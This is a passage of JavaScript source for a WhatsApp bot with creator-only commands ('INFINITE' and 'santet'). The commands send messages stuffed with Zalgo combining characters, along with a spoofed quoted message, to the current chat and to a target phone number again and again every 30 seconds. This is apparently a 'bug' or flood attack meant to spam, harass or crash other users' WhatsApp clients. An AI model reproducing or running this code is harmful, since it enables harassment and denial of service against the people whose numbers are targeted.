            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
         case 'santet':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"F̴̳͙̈́͋̔͌͝ͅa̸̛̹̱͎͖͐̇͗̀̍̍́̓͝x̸̠͕̘̹̎̂ ̸͈͓͉̯͛͆͋͑͛̅̈̔̈́F̶̛͕̖͔̖̣̣̖̼̫͋̇͗̅̆̕͜a̵̮̣̖̪̻̎̔̏r̶̝̐̊͊͗̈́̑̊́d̴̨̞̥̠̹̊̒̔̒̾̐̌͊a̷̦̜͓͉̅̑́̃n̴̨̦̠̳͘̕ ̷͇̼̱̯͕̱̘̤̙͊͐́̿͠Ṁ̷̫͔̣̬̬̺ă̷̮̻̦̹̣̰͍̰̌͜͠k̶̡̛̞̯͕̝̰̻̬̼̍͌̈̊ȩ̷̛͙̗͉̹̘͆̿͛̎͜r̸̛͇̟͕͓̮̟̉͛̇̈̍͊͝ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
